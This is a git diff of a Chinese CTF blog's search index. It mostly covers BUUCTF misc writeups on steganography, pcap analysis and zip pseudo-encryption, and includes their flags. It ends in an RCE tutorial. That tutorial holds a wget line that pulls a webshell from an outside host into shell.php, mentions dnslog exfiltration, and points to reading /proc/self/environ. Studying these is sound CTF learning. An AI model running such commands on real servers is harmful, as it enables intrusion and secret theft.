@@ -1,6 +1,168 @@
 <?xml version="1.0" encoding="utf-8"?>
 <search>
   <entry>
+    <title>BUU—MISC刷题记录</title>
+    <url>/2024/12/20/BUU%E2%80%94MISC%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/</url>
+    <content><![CDATA[<p>浅浅记录一下BUU里感觉比较有价值的题目</p>
+<h2 id="0荷兰宽带泄露"><a href="#0荷兰宽带泄露" class="headerlink" title="0荷兰宽带泄露"></a>0荷兰宽带泄露</h2><p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20241207192240105.png" alt="image-20241207192240105"></p>
+<p>解压后发现一个bin文件，第一次碰到不知道怎么处理，看了一下别的师傅的wp了解到一种新的工具：<code>RouterPassView</code>(用于破解宽带数据文件的密码)，题目没有提示Flag</p>
+<p>那试试用户名<img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20241207192618872.png" alt="image-20241207192618872"></p>
+<p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20241207192553975.png" alt="image-20241207192553975"></p>
+<p>解压发现是<code>xls</code>文件,猜测是<code>xls</code>隐写</p>
+<p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20241207193031701.png" alt="image-20241207193031701"></p>
+<p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20241207193626760.png" alt="image-20241207193626760"></p>
+<p>但是010一查发现有pk头,改后缀一查<img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20241207194005524.png" alt="image-20241207194005524"></p>
+<p><code>flag&#123;M9eVfi2Pcs#&#125;</code></p>
+<h2 id="1被劫持的神秘礼物"><a href="#1被劫持的神秘礼物" class="headerlink" title="1被劫持的神秘礼物"></a>1被劫持的神秘礼物</h2><p>下载是一个流量文件，结合标题应该是流量劫持</p>
+<p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20241207194738383.png" alt="image-20241207194738383"></p>
+<p>主要是HTTP流量，直接追踪流</p>
+<p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20241207194834914.png" alt="image-20241207194834914"></p>
+<p>用<code>captfencoder</code>MD5一下结束战斗</p>
+<p><code>flag&#123;1d240aafe21a86afc11f38a45b541a49&#125;</code></p>
+<h2 id="2被偷走的文件1"><a href="#2被偷走的文件1" class="headerlink" title="2被偷走的文件1"></a>2被偷走的文件1</h2><p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20241207195352502.png" alt="image-20241207195352502"></p>
+<p>用<code>foremost</code>分离，解压需要密码，先确定流量中没有藏密码，再暴力破解</p>
+<p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20241207200247505.png" alt="image-20241207200247505"></p>
+<p><code>flag&#123;6fe99a5d03fb01f833ec3caa80358fa3&#125;</code></p>
+<h2 id="3藏藏藏"><a href="#3藏藏藏" class="headerlink" title="3藏藏藏"></a>3藏藏藏</h2><p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20241207200530486.png" alt="image-20241207200530486"></p>
+<p>看到图片结合题目名，感觉图片隐写或者图片里包含文件<img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20241207200653951.png" alt="image-20241207200653951"></p>
+<p>顺利分离出一个压缩包，打开是一个docx文件，隐写无疑了</p>
+<p>然而里面是一个二维码（扫兴啊），直接扫就出来了</p>
+<p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20241207201042011.png" alt="image-20241207201042011"></p>
+<h2 id="4佛系青年"><a href="#4佛系青年" class="headerlink" title="4佛系青年"></a>4佛系青年</h2><p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20241207201306534.png" alt="image-20241207201306534"></p>
+<p>解压文档需要密码，有一张<code>png</code>是可以查看的，先010查一下</p>
+<p>查完没有藏文件，那应该就是隐写了</p>
+<p>结果没有发现隐写，感觉被骗了</p>
+<p>看一眼压缩包，是伪加密（这里本来没看见的，后来仔细看才发现，也算学到一点分别伪加密的方法）</p>
+<p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20241207204245901.png" alt="image-20241207204245901"></p>
+<p>改一下解压，文本里可以看到与佛论禅的加密，用一下随波逐流<img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20241207204051135.png" alt="image-20241207204051135"></p>
+<h2 id="5刷新过的图片"><a href="#5刷新过的图片" class="headerlink" title="5刷新过的图片"></a>5刷新过的图片</h2><p>附件是一张图片，提醒刷新，本来以为是什么操作，仔细想了以后是F5（刷新）隐写</p>
+<p>把项目git clone之后发现jdk17环境下运行直接报错，换jdk11看看<img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20241208164651743.png" alt="image-20241208164651743"></p>
+<p>成功了，打开提取的文件发现有PK头</p>
+<p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20241208164742896.png" alt="image-20241208164742896"></p>
+<p>一开始尝试用复制粘贴的办法在010里重新新建一个文件，但是失败（报错需要分卷，猜测是复制粘贴的过程中有些字符无法被复制）<img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20241208165127780.png" alt="image-20241208165127780"></p>
+<p>那么直接改原文件后缀，压缩包是伪加密，手改或者随波逐流走一下结束</p>
+<p><code>flag&#123;96efd0a2037d06f34199e921079778ee&#125;</code></p>
+<h2 id="6秘密文件"><a href="#6秘密文件" class="headerlink" title="6秘密文件"></a>6秘密文件</h2><p>附件是流量，wireshark启动！</p>
+<p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20241208165407266.png" alt="image-20241208165407266"></p>
+<p>foremost出一下，要密码，先尝试弱密码爆破</p>
+<p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20241208165707184.png" alt="image-20241208165707184"></p>
+<p><code>flag&#123;d72e5a671aa50fa5f400e5d10eedeaa5&#125;</code></p>
+<h2 id="7你猜我是个啥"><a href="#7你猜我是个啥" class="headerlink" title="7你猜我是个啥"></a>7你猜我是个啥</h2><p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20241208165810484.png" alt="image-20241208165810484"></p>
+<p>看来是改了后缀，010先查查看</p>
+<p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20241208165945001.png" alt="image-20241208165945001"></p>
+<p>演都不演了…</p>
+<h2 id="8鸡你太美"><a href="#8鸡你太美" class="headerlink" title="8鸡你太美"></a>8鸡你太美</h2><p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20241208170109877.png" alt="image-20241208170109877"></p>
+<p>盯完帧没有东西，看看副本，发现已经损坏</p>
+<p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20241208172403139.png" alt="image-20241208172403139">用010一查是缺少文件头手动补上</p>
+<p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20241208171838407.png" alt="image-20241208171838407"></p>
+<p>（这里-其实是_）</p>
+<h2 id="9神奇的二维码"><a href="#9神奇的二维码" class="headerlink" title="9神奇的二维码"></a>9神奇的二维码</h2><p>附件是一张二维码，先扫扫看</p>
+<p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20241208194745048.png" alt="image-20241208194745048"></p>
+<p>看来不在这里，用010查一下<img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20241208194925593.png" alt="image-20241208194925593"></p>
+<p>里面藏了文件，用 <code>binwalk</code>分离（foremost会分不出来）</p>
+<p>分出来四个包，分别解压<img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20241208195041436.png" alt="image-20241208195041436"></p>
+<p>其中一个包解压是一张jpg和一个压缩包（内含一个同名jpg），有两种想法，一种是压缩可读图片为压缩包明文攻击（<code>crc</code>校验值相同），另一种就是暴力拆包</p>
+<p>先暴力拆包，结果显示不给拆<img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20241208205419372.png" alt="image-20241208205419372"></p>
+<blockquote>
+<p>[!NOTE]</p>
+<p>以下为对题目考察的不是明文攻击的验证，可以跳过</p>
+</blockquote>
+<p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20241208200829953.png" alt="image-20241208200829953"></p>
+<p>初步看一下大小是一样的，那么直接查<code>crc</code>值</p>
+<p>这里我们用ubuntu查，使用<code>crc32</code>命令</p>
+<pre><code class="highlight bash"><span class="built_in">sudo</span> apt install libarchive-zip-perl
+crc32 flag.jpg</code></pre>
+
+<p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20241208202527536.png" alt="image-20241208202527536"></p>
+<p>结合压缩包的crc<code>24A345DA</code>，得出不是明文攻击</p>
+<p>还是看看其他几个解压出来的东西吧<img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20241208203221291.png" alt="image-20241208203221291"></p>
+<p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20241208203324389.png" alt="image-20241208203324389"></p>
+<p>到目前为止没有什么用处，看看另一个加密的音频文件和docx文件<img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20241208203515033.png" alt="image-20241208203515033"></p>
+<p>这么长的base64还是要忍不住想是不是base64和图像之间的转换的，但是区区8k字符加上还有一个没有解压的包直接让我打消这个念头了，直接<code>basecrack</code>伺候</p>
+<pre><code class="highlight bash">python3 basecrack.py -m -f flag.txt</code></pre>
+
+<p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20241208204133481.png" alt="image-20241208204133481">解压之后，用Audacity看一下，一眼摩斯</p>
+<p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20241208204450830.png" alt="image-20241208204450830"></p>
+<p>水平有限，还是手敲罢</p>
+<pre><code class="highlight plaintext">11 111 010 000 0 00 000 0001 0 010 1011 0001 0 010 1011 0 01 000 1011</code></pre>
+
+<p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20241208204944858.png" alt="image-20241208204944858">大写不对，换个小写</p>
+<p>鉴定为图片纯纯的诈骗（恼</p>
+<h2 id="10梅花香自苦寒来"><a href="#10梅花香自苦寒来" class="headerlink" title="10梅花香自苦寒来"></a>10梅花香自苦寒来</h2><p>附件是一张<code>png</code>，没有其他明显的提示，看一眼属性</p>
+<p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20241209152723027.png" alt="image-20241209152723027"></p>
+<p>要画图，那么应该藏了坐标，010查一下</p>
+<p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20241209152821648.png" alt="image-20241209152821648"></p>
+<p>可以看到文件尾藏了一种数据，接下来有两种方法</p>
+<blockquote>
+<p>随波逐流</p>
+</blockquote>
+<p>将文件拖入会自动提取并且解码，再用其内置的坐标画图最终得到一张反色的二维码</p>
+<p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20241209153156877.png" alt="image-20241209153156877"></p>
+<p>这个时候用<code>stegsolve</code>反色再扫就出来了</p>
+<blockquote>
+<p>脚本画图</p>
+</blockquote>
+<p>选首尾位置复制到记事本，复制到厨子再hex解码，得到一串坐标<img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20241209154148273.png" alt="image-20241209154148273"></p>
+<p>贴到txt里，接下来就是画图，参考了别的师傅的wp,有两种做法</p>
+<p>​	<code>*gnuplot*</code>绘图</p>
+<p>贴个脚本先</p>
+<pre><code class="highlight plaintext">with open(&#x27;flag.txt&#x27;, &#x27;r&#x27;) as res:  # 坐标格式文件比如(7,7)
+    re = res.read()
+    res.close()
+    
+with open(&#x27;output.txt&#x27;, &#x27;w&#x27;) as gnup:   # 将转换后的坐标写入gnuplotTxt.txt
+    re = re.split()
+    tem = &#x27;&#x27;
+    for i in range(0, len(re)):
+        tem = re[i]
+        tem = tem.lstrip(&#x27;(&#x27;)
+        tem = tem.rstrip(&#x27;)&#x27;)
+        for j in range(0, len(tem)):
+            if tem[j] == &#x27;,&#x27;:
+                tem = tem[:j] + &#x27; &#x27; + tem[j+1:]
+        gnup.write(tem + &#x27;\n&#x27;)
+    gnup.close()</code></pre>
+
+<p>得到去括号，去逗号的坐标值</p>
+<p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20241209155236795.png" alt="image-20241209155236795"></p>
+<p>贴一下ubuntu下的下载和使用方法</p>
+<pre><code class="highlight bash"><span class="built_in">sudo</span> apt-get install gnuplot-x11
+gnuplot
+plot <span class="string">&quot;output.txt&quot;</span></code></pre>
+
+<p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20241209155627592.png" alt="image-20241209155627592"></p>
+<p>可以扫出来</p>
+<p>​	<em>matplotlib</em>绘图</p>
+<p>把原文本去括号，用脚本跑</p>
+<pre><code class="highlight plaintext">import matplotlib.pyplot as plt
+import numpy as np
+with open(&#x27;flag.txt&#x27;, &#x27;r&#x27;) as res:
+    re = res.read()
+    res.close()
+
+with open(&#x27;output.txt&#x27;, &#x27;w&#x27;) as gnup:  # 将转换后的坐标写入gnuplotTxt.txt
+    re = re.split()
+    tem = &#x27;&#x27;
+    for i in range(0, len(re)):
+        tem = re[i]
+        tem = tem.lstrip(&#x27;(&#x27;)
+        tem = tem.rstrip(&#x27;)&#x27;)
+        gnup.write(tem + &#x27;\n&#x27;)
+    gnup.close()
+x, y = np.loadtxt(&#x27;output.txt&#x27;, delimiter=&#x27;,&#x27;, unpack=True)
+plt.plot(x, y, &#x27;.&#x27;)
+plt.show()</code></pre>
+
+<p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20241209162242387.png" alt="image-20241209162242387"></p>
+]]></content>
+      <categories>
+        <category>CTF</category>
+      </categories>
+      <tags>
+        <tag>misc</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>2025春秋杯冬季赛</title>
     <url>/2025/01/21/2025%E6%98%A5%E7%A7%8B%E6%9D%AF%E5%86%AC%E5%AD%A3%E8%B5%9B/</url>
     <content><![CDATA[<p>菜鸟第一次打这种公开赛，感觉被橄榄了，第二天两个pyjail是一点办法都没有啊。。。</p>
@@ -338,168 +500,6 @@ bkcrack -C flag.zip -c flag.png -p png_header -o 0</code></pre>
       </tags>
   </entry>
   <entry>
-    <title>BUU—MISC刷题记录</title>
-    <url>/2024/12/20/BUU%E2%80%94MISC%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/</url>
-    <content><![CDATA[<p>浅浅记录一下BUU里感觉比较有价值的题目</p>
-<h2 id="0荷兰宽带泄露"><a href="#0荷兰宽带泄露" class="headerlink" title="0荷兰宽带泄露"></a>0荷兰宽带泄露</h2><p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20241207192240105.png" alt="image-20241207192240105"></p>
-<p>解压后发现一个bin文件，第一次碰到不知道怎么处理，看了一下别的师傅的wp了解到一种新的工具：<code>RouterPassView</code>(用于破解宽带数据文件的密码)，题目没有提示Flag</p>
-<p>那试试用户名<img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20241207192618872.png" alt="image-20241207192618872"></p>
-<p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20241207192553975.png" alt="image-20241207192553975"></p>
-<p>解压发现是<code>xls</code>文件,猜测是<code>xls</code>隐写</p>
-<p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20241207193031701.png" alt="image-20241207193031701"></p>
-<p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20241207193626760.png" alt="image-20241207193626760"></p>
-<p>但是010一查发现有pk头,改后缀一查<img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20241207194005524.png" alt="image-20241207194005524"></p>
-<p><code>flag&#123;M9eVfi2Pcs#&#125;</code></p>
-<h2 id="1被劫持的神秘礼物"><a href="#1被劫持的神秘礼物" class="headerlink" title="1被劫持的神秘礼物"></a>1被劫持的神秘礼物</h2><p>下载是一个流量文件，结合标题应该是流量劫持</p>
-<p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20241207194738383.png" alt="image-20241207194738383"></p>
-<p>主要是HTTP流量，直接追踪流</p>
-<p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20241207194834914.png" alt="image-20241207194834914"></p>
-<p>用<code>captfencoder</code>MD5一下结束战斗</p>
-<p><code>flag&#123;1d240aafe21a86afc11f38a45b541a49&#125;</code></p>
-<h2 id="2被偷走的文件1"><a href="#2被偷走的文件1" class="headerlink" title="2被偷走的文件1"></a>2被偷走的文件1</h2><p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20241207195352502.png" alt="image-20241207195352502"></p>
-<p>用<code>foremost</code>分离，解压需要密码，先确定流量中没有藏密码，再暴力破解</p>
-<p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20241207200247505.png" alt="image-20241207200247505"></p>
-<p><code>flag&#123;6fe99a5d03fb01f833ec3caa80358fa3&#125;</code></p>
-<h2 id="3藏藏藏"><a href="#3藏藏藏" class="headerlink" title="3藏藏藏"></a>3藏藏藏</h2><p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20241207200530486.png" alt="image-20241207200530486"></p>
-<p>看到图片结合题目名，感觉图片隐写或者图片里包含文件<img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20241207200653951.png" alt="image-20241207200653951"></p>
-<p>顺利分离出一个压缩包，打开是一个docx文件，隐写无疑了</p>
-<p>然而里面是一个二维码（扫兴啊），直接扫就出来了</p>
-<p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20241207201042011.png" alt="image-20241207201042011"></p>
-<h2 id="4佛系青年"><a href="#4佛系青年" class="headerlink" title="4佛系青年"></a>4佛系青年</h2><p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20241207201306534.png" alt="image-20241207201306534"></p>
-<p>解压文档需要密码，有一张<code>png</code>是可以查看的，先010查一下</p>
-<p>查完没有藏文件，那应该就是隐写了</p>
-<p>结果没有发现隐写，感觉被骗了</p>
-<p>看一眼压缩包，是伪加密（这里本来没看见的，后来仔细看才发现，也算学到一点分别伪加密的方法）</p>
-<p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20241207204245901.png" alt="image-20241207204245901"></p>
-<p>改一下解压，文本里可以看到与佛论禅的加密，用一下随波逐流<img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20241207204051135.png" alt="image-20241207204051135"></p>
-<h2 id="5刷新过的图片"><a href="#5刷新过的图片" class="headerlink" title="5刷新过的图片"></a>5刷新过的图片</h2><p>附件是一张图片，提醒刷新，本来以为是什么操作，仔细想了以后是F5（刷新）隐写</p>
-<p>把项目git clone之后发现jdk17环境下运行直接报错，换jdk11看看<img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20241208164651743.png" alt="image-20241208164651743"></p>
-<p>成功了，打开提取的文件发现有PK头</p>
-<p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20241208164742896.png" alt="image-20241208164742896"></p>
-<p>一开始尝试用复制粘贴的办法在010里重新新建一个文件，但是失败（报错需要分卷，猜测是复制粘贴的过程中有些字符无法被复制）<img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20241208165127780.png" alt="image-20241208165127780"></p>
-<p>那么直接改原文件后缀，压缩包是伪加密，手改或者随波逐流走一下结束</p>
-<p><code>flag&#123;96efd0a2037d06f34199e921079778ee&#125;</code></p>
-<h2 id="6秘密文件"><a href="#6秘密文件" class="headerlink" title="6秘密文件"></a>6秘密文件</h2><p>附件是流量，wireshark启动！</p>
-<p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20241208165407266.png" alt="image-20241208165407266"></p>
-<p>foremost出一下，要密码，先尝试弱密码爆破</p>
-<p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20241208165707184.png" alt="image-20241208165707184"></p>
-<p><code>flag&#123;d72e5a671aa50fa5f400e5d10eedeaa5&#125;</code></p>
-<h2 id="7你猜我是个啥"><a href="#7你猜我是个啥" class="headerlink" title="7你猜我是个啥"></a>7你猜我是个啥</h2><p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20241208165810484.png" alt="image-20241208165810484"></p>
-<p>看来是改了后缀，010先查查看</p>
-<p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20241208165945001.png" alt="image-20241208165945001"></p>
-<p>演都不演了…</p>
-<h2 id="8鸡你太美"><a href="#8鸡你太美" class="headerlink" title="8鸡你太美"></a>8鸡你太美</h2><p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20241208170109877.png" alt="image-20241208170109877"></p>
-<p>盯完帧没有东西，看看副本，发现已经损坏</p>
-<p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20241208172403139.png" alt="image-20241208172403139">用010一查是缺少文件头手动补上</p>
-<p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20241208171838407.png" alt="image-20241208171838407"></p>
-<p>（这里-其实是_）</p>
-<h2 id="9神奇的二维码"><a href="#9神奇的二维码" class="headerlink" title="9神奇的二维码"></a>9神奇的二维码</h2><p>附件是一张二维码，先扫扫看</p>
-<p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20241208194745048.png" alt="image-20241208194745048"></p>
-<p>看来不在这里，用010查一下<img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20241208194925593.png" alt="image-20241208194925593"></p>
-<p>里面藏了文件，用 <code>binwalk</code>分离（foremost会分不出来）</p>
-<p>分出来四个包，分别解压<img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20241208195041436.png" alt="image-20241208195041436"></p>
-<p>其中一个包解压是一张jpg和一个压缩包（内含一个同名jpg），有两种想法，一种是压缩可读图片为压缩包明文攻击（<code>crc</code>校验值相同），另一种就是暴力拆包</p>
-<p>先暴力拆包，结果显示不给拆<img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20241208205419372.png" alt="image-20241208205419372"></p>
-<blockquote>
-<p>[!NOTE]</p>
-<p>以下为对题目考察的不是明文攻击的验证，可以跳过</p>
-</blockquote>
-<p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20241208200829953.png" alt="image-20241208200829953"></p>
-<p>初步看一下大小是一样的，那么直接查<code>crc</code>值</p>
-<p>这里我们用ubuntu查，使用<code>crc32</code>命令</p>
-<pre><code class="highlight bash"><span class="built_in">sudo</span> apt install libarchive-zip-perl
-crc32 flag.jpg</code></pre>
-
-<p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20241208202527536.png" alt="image-20241208202527536"></p>
-<p>结合压缩包的crc<code>24A345DA</code>，得出不是明文攻击</p>
-<p>还是看看其他几个解压出来的东西吧<img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20241208203221291.png" alt="image-20241208203221291"></p>
-<p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20241208203324389.png" alt="image-20241208203324389"></p>
-<p>到目前为止没有什么用处，看看另一个加密的音频文件和docx文件<img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20241208203515033.png" alt="image-20241208203515033"></p>
-<p>这么长的base64还是要忍不住想是不是base64和图像之间的转换的，但是区区8k字符加上还有一个没有解压的包直接让我打消这个念头了，直接<code>basecrack</code>伺候</p>
-<pre><code class="highlight bash">python3 basecrack.py -m -f flag.txt</code></pre>
-
-<p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20241208204133481.png" alt="image-20241208204133481">解压之后，用Audacity看一下，一眼摩斯</p>
-<p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20241208204450830.png" alt="image-20241208204450830"></p>
-<p>水平有限，还是手敲罢</p>
-<pre><code class="highlight plaintext">11 111 010 000 0 00 000 0001 0 010 1011 0001 0 010 1011 0 01 000 1011</code></pre>
-
-<p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20241208204944858.png" alt="image-20241208204944858">大写不对，换个小写</p>
-<p>鉴定为图片纯纯的诈骗（恼</p>
-<h2 id="10梅花香自苦寒来"><a href="#10梅花香自苦寒来" class="headerlink" title="10梅花香自苦寒来"></a>10梅花香自苦寒来</h2><p>附件是一张<code>png</code>，没有其他明显的提示，看一眼属性</p>
-<p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20241209152723027.png" alt="image-20241209152723027"></p>
-<p>要画图，那么应该藏了坐标，010查一下</p>
-<p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20241209152821648.png" alt="image-20241209152821648"></p>
-<p>可以看到文件尾藏了一种数据，接下来有两种方法</p>
-<blockquote>
-<p>随波逐流</p>
-</blockquote>
-<p>将文件拖入会自动提取并且解码，再用其内置的坐标画图最终得到一张反色的二维码</p>
-<p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20241209153156877.png" alt="image-20241209153156877"></p>
-<p>这个时候用<code>stegsolve</code>反色再扫就出来了</p>
-<blockquote>
-<p>脚本画图</p>
-</blockquote>
-<p>选首尾位置复制到记事本，复制到厨子再hex解码，得到一串坐标<img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20241209154148273.png" alt="image-20241209154148273"></p>
-<p>贴到txt里，接下来就是画图，参考了别的师傅的wp,有两种做法</p>
-<p>​	<code>*gnuplot*</code>绘图</p>
-<p>贴个脚本先</p>
-<pre><code class="highlight plaintext">with open(&#x27;flag.txt&#x27;, &#x27;r&#x27;) as res:  # 坐标格式文件比如(7,7)
-    re = res.read()
-    res.close()
-    
-with open(&#x27;output.txt&#x27;, &#x27;w&#x27;) as gnup:   # 将转换后的坐标写入gnuplotTxt.txt
-    re = re.split()
-    tem = &#x27;&#x27;
-    for i in range(0, len(re)):
-        tem = re[i]
-        tem = tem.lstrip(&#x27;(&#x27;)
-        tem = tem.rstrip(&#x27;)&#x27;)
-        for j in range(0, len(tem)):
-            if tem[j] == &#x27;,&#x27;:
-                tem = tem[:j] + &#x27; &#x27; + tem[j+1:]
-        gnup.write(tem + &#x27;\n&#x27;)
-    gnup.close()</code></pre>
-
-<p>得到去括号，去逗号的坐标值</p>
-<p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20241209155236795.png" alt="image-20241209155236795"></p>
-<p>贴一下ubuntu下的下载和使用方法</p>
-<pre><code class="highlight bash"><span class="built_in">sudo</span> apt-get install gnuplot-x11
-gnuplot
-plot <span class="string">&quot;output.txt&quot;</span></code></pre>
-
-<p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20241209155627592.png" alt="image-20241209155627592"></p>
-<p>可以扫出来</p>
-<p>​	<em>matplotlib</em>绘图</p>
-<p>把原文本去括号，用脚本跑</p>
-<pre><code class="highlight plaintext">import matplotlib.pyplot as plt
-import numpy as np
-with open(&#x27;flag.txt&#x27;, &#x27;r&#x27;) as res:
-    re = res.read()
-    res.close()
-
-with open(&#x27;output.txt&#x27;, &#x27;w&#x27;) as gnup:  # 将转换后的坐标写入gnuplotTxt.txt
-    re = re.split()
-    tem = &#x27;&#x27;
-    for i in range(0, len(re)):
-        tem = re[i]
-        tem = tem.lstrip(&#x27;(&#x27;)
-        tem = tem.rstrip(&#x27;)&#x27;)
-        gnup.write(tem + &#x27;\n&#x27;)
-    gnup.close()
-x, y = np.loadtxt(&#x27;output.txt&#x27;, delimiter=&#x27;,&#x27;, unpack=True)
-plt.plot(x, y, &#x27;.&#x27;)
-plt.show()</code></pre>
-
-<p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20241209162242387.png" alt="image-20241209162242387"></p>
-]]></content>
-      <categories>
-        <category>CTF</category>
-      </categories>
-      <tags>
-        <tag>misc</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>RCE</title>
     <url>/2025/01/21/RCE/</url>
     <content><![CDATA[<h1 id="RCE（远程代码执行漏洞）原理及漏洞相关"><a href="#RCE（远程代码执行漏洞）原理及漏洞相关" class="headerlink" title="RCE（远程代码执行漏洞）原理及漏洞相关"></a>RCE（远程代码执行漏洞）原理及漏洞相关</h1><p>RCE，Romote Code Execution漏洞，即通过向后台服务器远程注入系统命令或代码来控制后台系统</p>
@@ -692,9 +692,95 @@ print(h)</code></pre>
 <pre><code class="highlight plaintext">wget http://ip/shell.txt &gt; shell.php或者wget http://ip/shell.txt -O shell.php</code></pre>
 
 <p>8.dnslog外带数据</p>
-]]></content>
+<h2 id="都是fakeflag-试试环境变量-proc-self-environ和env指令"><a href="#都是fakeflag-试试环境变量-proc-self-environ和env指令" class="headerlink" title="都是fakeflag ,试试环境变量&#x2F;proc&#x2F;self&#x2F;environ和env指令"></a>都是fakeflag ,试试环境变量&#x2F;proc&#x2F;self&#x2F;environ和env指令</h2>]]></content>
       <tags>
         <tag>-Web -CTF</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>PHP反序列化</title>
+    <url>/2025/03/09/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/</url>
